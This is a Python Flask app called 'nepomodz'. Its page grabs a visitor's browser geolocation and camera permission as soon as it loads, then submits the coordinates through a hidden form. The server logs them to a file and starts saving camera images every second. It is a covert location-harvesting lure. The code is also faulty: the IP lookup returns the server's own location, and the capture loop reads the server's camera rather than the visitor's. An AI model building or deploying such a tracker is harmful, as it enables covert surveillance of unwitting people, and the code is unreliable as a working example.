from flask import Flask, request, render_template_string
import os
import requests
from datetime import datetime
import threading
import cv2
import time

app = Flask(__name__)

# Function to get approximate location from IP address
def get_approximate_location():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        location = data.get('loc', 'Unknown')
        city = data.get('city', 'Unknown')
        region = data.get('region', 'Unknown')
        country = data.get('country', 'Unknown')
        return f"IP Location: {location}, City: {city}, Region: {region}, Country: {country}"
    except Exception as e:
        return f"IP Location: Unknown (Error: {str(e)})"

# Function to capture images continuously
def capture_images():
    # Create a directory to save images
    if not os.path.exists('captured_images'):
        os.makedirs('captured_images')

    # Initialize the camera
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Error: Could not open camera.")
        return

    # Continuously capture images
    while True:
        ret, frame = cap.read()
        if ret:
            image_path = f"captured_images/image_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(image_path, frame)
            print(f"Image saved: {image_path}")
        else:
            print("Error: Could not capture image.")
        time.sleep(1)  # Capture an image every second

    # Release the camera (this won't be reached in this example)
    cap.release()

# HTML template with JavaScript to request camera and location access
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>nepomodz Access Request</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showPosition(position) {
            document.getElementById('location').value = position.coords.latitude + "," + position.coords.longitude;
            document.getElementById('dataForm').submit();
        }

        function getCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    alert("Camera access granted.");
                    document.getElementById('camera').value = "Accessed";
                    document.getElementById('dataForm').submit();
                })
                .catch(function(err) {
                    alert("Camera access denied.");
                });
        }

        window.onload = function() {
            getLocation();
            getCamera();
        }
    </script>
</head>
<body>
    <h1>Welcome to nepomodz</h1>
    <form id="dataForm" action="/save" method="post">
        <input type="hidden" id="location" name="location">
        <input type="hidden" id="camera" name="camera">
    </form>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/save', methods=['POST'])
def save():
    location = request.form.get('location', 'Not provided')
    camera = request.form.get('camera', 'Not provided')
    ip_location = get_approximate_location()

    # Save data to file
    with open('data.txt', 'a') as f:
        f.write(f"Time: {datetime.now()}, Location: {location}, IP Location: {ip_location}, Camera: {camera}\n")

    # If camera access is granted, start capturing images
    if camera == "Accessed":
        print("Access has been granted. Starting to capture images...")
        threading.Thread(target=capture_images, daemon=True).start()

    return "Data saved by nepomodz."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)